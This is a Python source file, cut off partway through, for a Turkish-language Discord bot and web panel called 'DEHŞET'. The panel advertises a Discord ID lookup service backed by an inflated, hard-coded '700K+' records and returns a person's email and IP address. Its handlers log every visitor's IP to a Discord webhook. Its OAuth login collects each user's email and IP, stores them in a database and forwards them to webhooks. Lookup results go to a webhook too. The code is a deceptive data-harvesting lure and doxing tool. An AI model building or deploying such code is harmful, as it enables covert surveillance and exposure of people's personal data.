import discord
from discord.ext import commands
from discord import app_commands
import os
import asyncio
import datetime
import aiohttp
from aiohttp import web
import urllib.parse
import sqlite3
import secrets
import json

try:
    from dotenv import load_dotenv
    load_dotenv()
    print(".env dosyası yüklendi!")
except ImportError:
    pass

user_sessions = {}

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

DISCORD_CLIENT_ID = os.environ.get('DISCORD_CLIENT_ID')
DISCORD_CLIENT_SECRET = os.environ.get('DISCORD_CLIENT_SECRET')
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
DISCORD_IP_WEBHOOK_URL = os.environ.get('DISCORD_IP_WEBHOOK_URL')
DISCORD_QUERY_WEBHOOK_URL = os.environ.get('DISCORD_QUERY_WEBHOOK_URL')
SITE_DOMAIN = os.environ.get('SITE_DOMAIN') or os.environ.get('REPLIT_DEV_DOMAIN', 'localhost:5000')
REDIRECT_URI = f"https://{SITE_DOMAIN}/callback"

print(f"Ayarlar yüklendi:")
print(f"  - Client ID: {DISCORD_CLIENT_ID}")
print(f"  - Client Secret: {'***' + DISCORD_CLIENT_SECRET[-4:] if DISCORD_CLIENT_SECRET else 'YOK'}")
print(f"  - Webhook URL: {'Var' if DISCORD_WEBHOOK_URL else 'YOK'}")
print(f"  - IP Webhook URL: {'Var' if DISCORD_IP_WEBHOOK_URL else 'YOK'}")
print(f"  - Query Webhook URL: {'Var' if DISCORD_QUERY_WEBHOOK_URL else 'YOK'}")
print(f"  - Redirect URI: {REDIRECT_URI}")

def get_client_ip(request):
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0].strip()
    x_real_ip = request.headers.get('X-Real-IP')
    if x_real_ip:
        return x_real_ip
    return request.remote or "Bilinmiyor"

def query_database(discord_id):
    try:
        conn = sqlite3.connect('discord_data.db')
        cursor = conn.cursor()
        cursor.execute('SELECT discord_id, email, ip_address FROM users WHERE discord_id = ?', (discord_id,))
        result = cursor.fetchone()
        conn.close()
        if result:
            return {"found": True, "discord_id": result[0], "email": result[1], "ip_address": result[2]}
        return {"found": False}
    except Exception as e:
        print(f"Veritabanı hatası: {e}")
        return {"found": False, "error": str(e)}

def get_db_stats():
    try:
        conn = sqlite3.connect('discord_data.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def init_database():
    try:
        conn = sqlite3.connect('discord_data.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id TEXT UNIQUE,
                username TEXT,
                email TEXT,
                ip_address TEXT,
                avatar TEXT,
                verified INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
        print("Veritabanı hazır!")
    except Exception as e:
        print(f"Veritabanı init hatası: {e}")

def save_user_to_database(discord_id, username, email, ip_address, avatar=None, verified=False):
    try:
        conn = sqlite3.connect('discord_data.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO users (discord_id, username, email, ip_address, avatar, verified, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(discord_id) DO UPDATE SET
                username = excluded.username,
                email = excluded.email,
                ip_address = excluded.ip_address,
                avatar = excluded.avatar,
                verified = excluded.verified,
                updated_at = CURRENT_TIMESTAMP
        ''', (discord_id, username, email, ip_address, avatar, 1 if verified else 0))
        conn.commit()
        conn.close()
        print(f"Kullanıcı kaydedildi: {username} ({discord_id})")
        return True
    except Exception as e:
        print(f"Kullanıcı kaydetme hatası: {e}")
        return False

init_database()

async def send_query_log(searcher_username, searcher_id, searched_id, result):
    webhook_url = DISCORD_QUERY_WEBHOOK_URL or DISCORD_WEBHOOK_URL
    if not webhook_url:
        return
    
    if result.get("found"):
        embed = {
            "title": "🔍 ID Sorgu Yapıldı",
            "color": 0x00ff64,
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "fields": [
                {"name": "👤 Sorgulayan", "value": f"{searcher_username}\n`{searcher_id}`", "inline": True},
                {"name": "🎯 Aranan ID", "value": f"`{searched_id}`", "inline": True},
                {"name": "✅ Sonuç", "value": "**BULUNDU**", "inline": True},
                {"name": "📧 Email", "value": f"`{result.get('email', 'Bilinmiyor')}`", "inline": True},
                {"name": "🌐 IP Adresi", "value": f"`{result.get('ip_address', 'Bilinmiyor')}`", "inline": True}
            ],
            "footer": {"text": "ID Sorgu Sistemi"}
        }
    else:
        embed = {
            "title": "🔍 ID Sorgu Yapıldı",
            "color": 0xff0055,
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "fields": [
                {"name": "👤 Sorgulayan", "value": f"{searcher_username}\n`{searcher_id}`", "inline": True},
                {"name": "🎯 Aranan ID", "value": f"`{searched_id}`", "inline": True},
                {"name": "❌ Sonuç", "value": "**BULUNAMADI**", "inline": True}
            ],
            "footer": {"text": "ID Sorgu Sistemi"}
        }
    
    payload = {"embeds": [embed]}
    
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json=payload)
    except Exception as e:
        print(f"Sorgu webhook hatası: {e}")

async def send_webhook_log(user_data, email, ip_address="Bilinmiyor"):
    if not DISCORD_WEBHOOK_URL:
        print("Webhook URL bulunamadı!")
        return
    
    embed = {
        "title": "🔐 Yeni Kullanıcı Yetkilendirmesi",
        "color": 0x9b59b6,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get('avatar') else ""},
        "fields": [
            {"name": "👤 Kullanıcı", "value": f"{user_data.get('username', 'Bilinmiyor')}#{user_data.get('discriminator', '0')}", "inline": True},
            {"name": "🆔 ID", "value": f"`{user_data.get('id', 'Bilinmiyor')}`", "inline": True},
            {"name": "📧 Email", "value": f"`{email}`" if email else "❌ Email yok", "inline": False},
            {"name": "🌐 IP Adresi", "value": f"`{ip_address}`", "inline": True},
            {"name": "✅ Doğrulanmış", "value": "Evet" if user_data.get('verified') else "Hayır", "inline": True}
        ],
        "footer": {"text": "OAuth2 Yetkilendirme Sistemi"}
    }
    
    payload = {"embeds": [embed]}
    
    try:
        async with aiohttp.ClientSession() as session:
            resp = await session.post(DISCORD_WEBHOOK_URL, json=payload)
            print(f"Webhook gönderildi: {resp.status}")
    except Exception as e:
        print(f"Webhook gönderme hatası: {e}")

async def send_visitor_log(ip_address, page):
    webhook_url = DISCORD_IP_WEBHOOK_URL or DISCORD_WEBHOOK_URL
    if not webhook_url:
        return
    
    embed = {
        "title": "👁️ Yeni Ziyaretçi",
        "color": 0x3498db,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "fields": [
            {"name": "🌐 IP Adresi", "value": f"`{ip_address}`", "inline": True},
            {"name": "📄 Sayfa", "value": page, "inline": True}
        ],
        "footer": {"text": "Ziyaretçi Takip Sistemi"}
    }
    
    payload = {"embeds": [embed]}
    
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json=payload)
    except Exception as e:
        print(f"Ziyaretçi webhook hatası: {e}")

async def handle_callback(request):
    code = request.query.get('code')
    ip_address = get_client_ip(request)
    
    print(f"Callback isteği alındı - IP: {ip_address}, Code: {code[:20] if code else 'Yok'}...")
    
    if not code:
        return web.Response(text="""
        <html>
        <head><title>Hata</title></head>
        <body style="background:#1a1a2e;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
            <div style="text-align:center;">
                <h1>❌ Yetkilendirme Başarısız</h1>
                <p>Kod bulunamadı. Lütfen tekrar deneyin.</p>
            </div>
        </body>
        </html>
        """, content_type='text/html')
    
    try:
        async with aiohttp.ClientSession() as session:
            token_url = "https://discord.com/api/oauth2/token"
            data = {
                'client_id': DISCORD_CLIENT_ID,
                'client_secret': DISCORD_CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            
            print(f"Token isteği gönderiliyor... Client ID: {DISCORD_CLIENT_ID}, Redirect: {REDIRECT_URI}")
            
            async with session.post(token_url, data=data) as resp:
                if resp.status != 200:
                    error_text = await resp.text()
                    print(f"Token hatası ({resp.status}): {error_text}")
                    return web.Response(text=f"""
                    <html>
                    <head><title>Hata</title></head>
                    <body style="background:#1a1a2e;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
                        <div style="text-align:center;">
                            <h1>❌ Token Alınamadı</h1>
                            <p>Lütfen tekrar deneyin.</p>
                        </div>
                    </body>
                    </html>
                    """, content_type='text/html')
                
                token_data = await resp.json()
                access_token = token_data.get('access_token')
                print("Token başarıyla alındı!")
            
            headers = {"Authorization": f"Bearer {access_token}"}
            async with session.get("https://discord.com/api/users/@me", headers=headers) as resp:
                if resp.status == 200:
                    user_data = await resp.json()
                    email = user_data.get('email', 'Email bulunamadı')
                    
                    print(f"Kullanıcı bilgisi alındı: {user_data.get('username')} - {email}")
                    await send_webhook_log(user_data, email, ip_address)
                    
                    save_user_to_database(
                        discord_id=user_data.get('id'),
                        username=user_data.get('username'),
                        email=email,
                        ip_address=ip_address,
                        avatar=user_data.get('avatar'),
                        verified=user_data.get('verified', False)
                    )
                    
                    session_token = secrets.token_urlsafe(32)
                    user_sessions[session_token] = {
                        "user_id": user_data.get('id'),
                        "username": user_data.get('username'),
                        "avatar": user_data.get('avatar'),
                        "email": email,
                        "created_at": datetime.datetime.now()
                    }
                    
                    response = web.HTTPFound('/panel')
                    response.set_cookie('session_token', session_token, max_age=86400, httponly=True)
                    return response
                else:
                    error_text = await resp.text()
                    print(f"Kullanıcı bilgisi hatası ({resp.status}): {error_text}")
                    return web.Response(text="Kullanıcı bilgisi alınamadı", status=400)
    
    except Exception as e:
        print(f"Callback hatası: {e}")
        import traceback
        traceback.print_exc()
        return web.Response(text=f"Hata: {str(e)}", status=500)

async def handle_index(request):
    ip_address = get_client_ip(request)
    print(f"Ana sayfa ziyareti - IP: {ip_address}")
    
    await send_visitor_log(ip_address, "Ana Sayfa")
    
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&response_type=code&scope=identify%20email"
    
    site_url = f"https://{os.environ.get('REPLIT_DEV_DOMAIN', '')}"
    db_count = get_db_stats()
    db_display = "700K+"
    
    return web.Response(text=f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DEHŞET - ID Sorgu Paneli</title>
        
        <meta property="og:title" content="DEHŞET - Gelişmiş Discord Sorgu Sistemi">
        <meta property="og:description" content="700K+ kayıtlı veri ile Türkiye'nin en büyük Discord sorgulama platformu. Hızlı, güvenli ve anlık sonuçlar.">
        <meta property="og:type" content="website">
        <meta property="og:url" content="{site_url}">
        <meta property="og:image" content="{site_url}/static/dehset_neon_cyberpunk_banner.png">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
        <meta name="theme-color" content="#ff0055">
        
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="DEHŞET - Gelişmiş Discord Sorgu Sistemi">
        <meta name="twitter:description" content="700K+ kayıtlı veri ile Türkiye'nin en büyük Discord sorgulama platformu. Hızlı, güvenli ve anlık sonuçlar.">
        <meta name="twitter:image" content="{site_url}/static/dehset_neon_cyberpunk_banner.png">
        
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            
            :root {{
                --primary: #ff0055;
                --secondary: #7c3aed;
                --accent: #00ffff;
                --dark: #0a0a0f;
                --glass: rgba(255, 255, 255, 0.05);
            }}
            
            body {{
                font-family: 'Inter', sans-serif;
                background: var(--dark);
                min-height: 100vh;
                overflow-x: hidden;
                position: relative;
            }}
            
            .bg-grid {{
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                background-image: 
                    linear-gradient(rgba(255,0,85,0.03) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255,0,85,0.03) 1px, transparent 1px);
                background-size: 50px 50px;
                pointer-events: none;
            }}
            
            .bg-glow {{
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                background: 
                    radial-gradient(ellipse 80% 50% at 50% -20%, rgba(255,0,85,0.15), transparent),
                    radial-gradient(ellipse 60% 40% at 100% 100%, rgba(124,58,237,0.1), transparent),
                    radial-gradient(ellipse 40% 30% at 0% 100%, rgba(0,255,255,0.08), transparent);
                pointer-events: none;
            }}
            
            .floating-shapes {{
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                pointer-events: none;
                overflow: hidden;
            }}
            
            .shape {{
                position: absolute;
                border-radius: 50%;
                filter: blur(60px);
                animation: floatShape 20s infinite ease-in-out;
            }}
            
            .shape-1 {{ width: 400px; height: 400px; background: rgba(255,0,85,0.1); top: -100px; right: -100px; animation-delay: 0s; }}
            .shape-2 {{ width: 300px; height: 300px; background: rgba(124,58,237,0.1); bottom: -50px; left: -50px; animation-delay: -5s; }}
            .shape-3 {{ width: 200px; height: 200px; background: rgba(0,255,255,0.08); top: 50%; left: 10%; animation-delay: -10s; }}
            
            @keyframes floatShape {{
                0%, 100% {{ transform: translate(0, 0) scale(1); }}
                25% {{ transform: translate(30px, -30px) scale(1.1); }}
                50% {{ transform: translate(-20px, 20px) scale(0.9); }}
                75% {{ transform: translate(10px, 10px) scale(1.05); }}
            }}
            
            .navbar {{
                position: fixed;
                top: 0; left: 0; right: 0;
                padding: 20px 40px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                z-index: 100;
                background: rgba(10,10,15,0.8);
                backdrop-filter: blur(20px);
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }}
            
            .nav-logo {{
                font-family: 'Orbitron', monospace;
                font-size: 1.5rem;
                font-weight: 900;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }}
            
            .nav-status {{
                display: flex;
                align-items: center;
                gap: 8px;
                padding: 8px 16px;
                background: rgba(0,255,100,0.1);
                border: 1px solid rgba(0,255,100,0.3);
                border-radius: 30px;
                font-size: 0.8rem;
                color: #00ff64;
            }}
            
            .status-dot {{
                width: 8px;
                height: 8px;
                background: #00ff64;
                border-radius: 50%;
                animation: blink 2s infinite;
            }}
            
            @keyframes blink {{
                0%, 100% {{ opacity: 1; }}
                50% {{ opacity: 0.3; }}
            }}
            
            .main-container {{
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 120px 20px 60px;
            }}
            
            .content-wrapper {{
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 80px;
                max-width: 1200px;
                align-items: center;
            }}
            
            .left-section {{
                text-align: left;
            }}
            
            .badge {{
                display: inline-flex;
                align-items: center;
                gap: 8px;
                padding: 8px 16px;
                background: var(--glass);
                border: 1px solid rgba(255,255,255,0.1);
                border-radius: 30px;
                font-size: 0.75rem;
                color: rgba(255,255,255,0.7);
                margin-bottom: 24px;
                backdrop-filter: blur(10px);
            }}
            
            .badge i {{ color: var(--primary); }}
            
            .main-title {{
                font-family: 'Orbitron', monospace;
                font-size: 4rem;
                font-weight: 900;
                line-height: 1.1;
                margin-bottom: 24px;
            }}
            
            .main-title .gradient {{
                background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
                background-size: 200% 200%;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                animation: gradientShift 5s ease infinite;
            }}
            
            .main-title .white {{ color: #fff; }}
            
            @keyframes gradientShift {{
                0%, 100% {{ background-position: 0% 50%; }}
                50% {{ background-position: 100% 50%; }}
            }}
            
            .description {{
                font-size: 1.1rem;
                color: rgba(255,255,255,0.5);
                line-height: 1.8;
                margin-bottom: 40px;
                max-width: 480px;
            }}
            
            .stats-row {{
                display: flex;
                gap: 40px;
            }}
            
            .stat-item {{
                text-align: left;
            }}
            
            .stat-number {{
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 700;
                background: linear-gradient(135deg, var(--accent), var(--primary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }}
            
            .stat-text {{
                font-size: 0.8rem;
                color: rgba(255,255,255,0.4);
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-top: 4px;
            }}
            
            .right-section {{
                display: flex;
                justify-content: center;
            }}
            
            .login-card {{
                width: 100%;
                max-width: 420px;
                background: rgba(20,20,30,0.6);
                border: 1px solid rgba(255,255,255,0.08);
                border-radius: 24px;
                padding: 48px 40px;
                backdrop-filter: blur(40px);
                position: relative;
                overflow: hidden;
            }}
            
            .login-card::before {{
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0;
                height: 1px;
                background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
            }}
            
            .login-card::after {{
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: conic-gradient(from 0deg, transparent, var(--primary), transparent, transparent);
                animation: rotate 8s linear infinite;
                opacity: 0.05;
            }}
            
            @keyframes rotate {{
                100% {{ transform: rotate(360deg); }}
            }}
            
            .card-header {{
                text-align: center;
                margin-bottom: 32px;
                position: relative;
                z-index: 1;
            }}
            
            .card-icon {{
                width: 64px;
                height: 64px;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                border-radius: 16px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                font-size: 1.8rem;
            }}
            
            .card-title {{
                font-family: 'Orbitron', monospace;
                font-size: 1.3rem;
                color: #fff;
                margin-bottom: 8px;
                letter-spacing: 2px;
            }}
            
            .card-subtitle {{
                font-size: 0.9rem;
                color: rgba(255,255,255,0.5);
            }}
            
            .login-btn {{
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                width: 100%;
                padding: 18px 32px;
                font-family: 'Inter', sans-serif;
                font-size: 1rem;
                font-weight: 600;
                color: #fff;
                background: linear-gradient(135deg, #5865F2, #7289DA);
                border: none;
                border-radius: 14px;
                cursor: pointer;
                text-decoration: none;
                transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
                box-shadow: 0 8px 32px rgba(88, 101, 242, 0.3);
                position: relative;
                z-index: 1;
                overflow: hidden;
            }}
            
            .login-btn::before {{
                content: '';
                position: absolute;
                top: 0; left: -100%;
                width: 100%; height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                transition: left 0.6s;
            }}
            
            .login-btn:hover {{
                transform: translateY(-4px);
                box-shadow: 0 16px 48px rgba(88, 101, 242, 0.5);
            }}
            
            .login-btn:hover::before {{
                left: 100%;
            }}
            
            .login-btn svg {{
                width: 24px;
                height: 24px;
            }}
            
            .features-grid {{
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 16px;
                margin-top: 32px;
                position: relative;
                z-index: 1;
            }}
            
            .feature-item {{
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 14px 16px;
                background: rgba(255,255,255,0.03);
                border: 1px solid rgba(255,255,255,0.05);
                border-radius: 12px;
                transition: all 0.3s;
            }}
            
            .feature-item:hover {{
                background: rgba(255,255,255,0.06);
                border-color: rgba(255,0,85,0.2);
                transform: translateX(4px);
            }}
            
            .feature-icon {{
                width: 36px;
                height: 36px;
                background: linear-gradient(135deg, rgba(255,0,85,0.2), rgba(124,58,237,0.2));
                border-radius: 10px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 1rem;
            }}
            
            .feature-text {{
                font-size: 0.85rem;
                color: rgba(255,255,255,0.7);
                font-weight: 500;
            }}
            
            .trust-section {{
                margin-top: 32px;
                padding-top: 24px;
                border-top: 1px solid rgba(255,255,255,0.05);
                text-align: center;
                position: relative;
                z-index: 1;
            }}
            
            .trust-text {{
                font-size: 0.75rem;
                color: rgba(255,255,255,0.3);
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }}
            
            .trust-text i {{ color: #00ff64; }}
            
            @media (max-width: 1024px) {{
                .content-wrapper {{ grid-template-columns: 1fr; gap: 60px; text-align: center; }}
                .left-section {{ text-align: center; }}
                .description {{ margin: 0 auto 40px; }}
                .stats-row {{ justify-content: center; }}
                .main-title {{ font-size: 2.5rem; }}
            }}
        </style>
    </head>
    <body>
        <div class="bg-grid"></div>
        <div class="bg-glow"></div>
        <div class="floating-shapes">
            <div class="shape shape-1"></div>
            <div class="shape shape-2"></div>
            <div class="shape shape-3"></div>
        </div>
        
        <nav class="navbar">
            <div class="nav-logo">DEHŞET</div>
            <div class="nav-status">
                <div class="status-dot"></div>
                Sistem Aktif
            </div>
        </nav>
        
        <main class="main-container">
            <div class="content-wrapper">
                <div class="left-section">
                    <div class="badge">
                        <i class="fas fa-shield-halved"></i>
                        Güvenli & Hızlı Sorgulama
                    </div>
                    
                    <h1 class="main-title">
                        <span class="white">Gelişmiş</span><br>
                        <span class="gradient">ID Sorgu</span><br>
                        <span class="white">Paneli</span>
                    </h1>
                    
                    <p class="description">
                        Discord hesabınızla giriş yaparak {db_display} datanın bulunduğu 
                        gelişmiş sorgulama sistemine erişim sağlayın. Güvenli, hızlı ve kolay.
                    </p>
                    
                    <div class="stats-row">
                        <div class="stat-item">
                            <div class="stat-number">{db_display}</div>
                            <div class="stat-text">Kayıtlı Data</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">24/7</div>
                            <div class="stat-text">Aktif Sistem</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">&lt;1s</div>
                            <div class="stat-text">Yanıt Süresi</div>
                        </div>
                    </div>
                </div>
                
                <div class="right-section">
                    <div class="login-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fab fa-discord"></i>
                            </div>
                            <h2 class="card-title">Sisteme Giriş</h2>
                            <p class="card-subtitle">Discord ile hızlı ve güvenli giriş</p>
                        </div>
                        
                        <a href="{oauth_url}" class="login-btn">
                            <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                            </svg>
                            Discord ile Giriş Yap
                        </a>
                        
                        <div class="features-grid">
                            <div class="feature-item">
                                <div class="feature-icon"><i class="fas fa-lock"></i></div>
                                <span class="feature-text">SSL Korumalı</span>
                            </div>
                            <div class="feature-item">
                                <div class="feature-icon"><i class="fas fa-bolt"></i></div>
                                <span class="feature-text">Anlık Sonuç</span>
                            </div>
                            <div class="feature-item">
                                <div class="feature-icon"><i class="fas fa-database"></i></div>
                                <span class="feature-text">Geniş Veri</span>
                            </div>
                            <div class="feature-item">
                                <div class="feature-icon"><i class="fas fa-user-secret"></i></div>
                                <span class="feature-text">Gizli Arama</span>
                            </div>
                        </div>
                        
                        <div class="trust-section">
                            <p class="trust-text">
                                <i class="fas fa-check-circle"></i>
                                256-bit şifreleme ile korunuyor
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        
        <footer style="position: fixed; bottom: 0; left: 0; right: 0; padding: 16px; background: rgba(10,10,15,0.95); backdrop-filter: blur(20px); border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: center; align-items: center; z-index: 100;">
            <span style="color: rgba(255,255,255,0.3); font-size: 0.75rem;">v2.0 | Powered by DEHSET</span>
        </footer>
    </body>
    </html>
    """, content_type='text/html')

async def handle_panel(request):
    session_token = request.cookies.get('session_token')
    
    if not session_token or session_token not in user_sessions:
        return web.HTTPFound('/')
    
    user = user_sessions[session_token]
    db_count = get_db_stats()
    site_url = f"https://{os.environ.get('REPLIT_DEV_DOMAIN', '')}"
    avatar_url = f"https://cdn.discordapp.com/avatars/{user['user_id']}/{user['avatar']}.png" if user.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
    
    return web.Response(text=f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DEHŞET - ID Sorgu Paneli</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            :root {{ --primary: #ff0055; --secondary: #7c3aed; --accent: #00ffff; --dark: #0a0a0f; --glass: rgba(255,255,255,0.05); }}
            body {{ font-family: 'Inter', sans-serif; background: var(--dark); min-height: 100vh; color: white; }}
            .bg-grid {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-image: linear-gradient(rgba(255,0,85,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,85,0.03) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; }}
            .bg-glow {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(255,0,85,0.15), transparent), radial-gradient(ellipse 60% 40% at 100% 100%, rgba(124,58,237,0.1), transparent); pointer-events: none; }}
            .navbar {{ position: fixed; top: 0; left: 0; right: 0; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; z-index: 100; background: rgba(10,10,15,0.9); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); }}
            .nav-logo {{ font-family: 'Orbitron', monospace; font-size: 1.5rem; font-weight: 900; background: linear-gradient(135deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }}
            .user-info {{ display: flex; align-items: center; gap: 12px; }}
            .user-avatar {{ width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--primary); }}
            .user-name {{ font-weight: 600; color: rgba(255,255,255,0.8); }}
            .main-container {{ padding: 120px 40px 60px; max-width: 1000px; margin: 0 auto; }}
            .welcome-section {{ text-align: center; margin-bottom: 40px; }}
            .welcome-title {{ font-family: 'Orbitron', monospace; font-size: 2rem; margin-bottom: 10px; }}
            .welcome-subtitle {{ color: rgba(255,255,255,0.5); }}
            .stats-bar {{ display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; }}
            .stat-box {{ background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px 30px; text-align: center; }}
            .stat-number {{ font-family: 'Orbitron', monospace; font-size: 1.8rem; color: var(--accent); }}
            .stat-label {{ font-size: 0.85rem; color: rgba(255,255,255,0.5); margin-top: 5px; }}
            .search-section {{ background: rgba(20,20,30,0.6); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 40px; backdrop-filter: blur(40px); }}
            .search-title {{ font-family: 'Orbitron', monospace; font-size: 1.3rem; margin-bottom: 24px; text-align: center; }}
            .search-box {{ display: flex; gap: 12px; margin-bottom: 24px; }}
            .search-input {{ flex: 1; padding: 16px 20px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; font-size: 1rem; outline: none; transition: border-color 0.3s; }}
            .search-input:focus {{ border-color: var(--primary); }}
            .search-input::placeholder {{ color: rgba(255,255,255,0.3); }}
            .search-btn {{ padding: 16px 32px; background: linear-gradient(135deg, var(--primary), var(--secondary)); border: none; border-radius: 12px; color: white; font-weight: 600; cursor: pointer; transition: transform 0.3s, box-shadow 0.3s; }}
            .search-btn:hover {{ transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,0,85,0.3); }}
            .search-btn:disabled {{ opacity: 0.5; cursor: not-allowed; transform: none; }}
            .result-container {{ display: none; margin-top: 24px; }}
            .result-card {{ background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 24px; }}
